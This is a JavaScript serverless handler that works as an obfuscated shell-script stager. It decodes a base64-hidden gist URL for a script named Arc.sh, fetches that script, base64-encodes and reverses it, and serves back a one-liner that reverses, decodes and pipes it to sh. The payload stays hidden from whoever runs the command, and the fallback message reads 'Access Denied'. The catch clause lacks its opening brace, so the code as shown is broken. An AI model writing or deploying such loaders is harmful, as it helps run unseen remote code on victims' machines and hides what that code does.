export default async function handler(req, res) {
  const _U = Buffer.from("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==", 'base64').toString('utf8');

  try {
    const _R = await fetch(_U);
    const _S = await _R.text();
    
    const _O = Buffer.from(_S).toString('base64').split('').reverse().join('');
    
    res.setHeader("Content-Type", "text/plain");
    return res.status(200).send(`echo "${_O}" | rev | base64 -d | sh`);
  } catch (e)  
    return res.status(500).send("echo 'Access Denied'");
  }
}
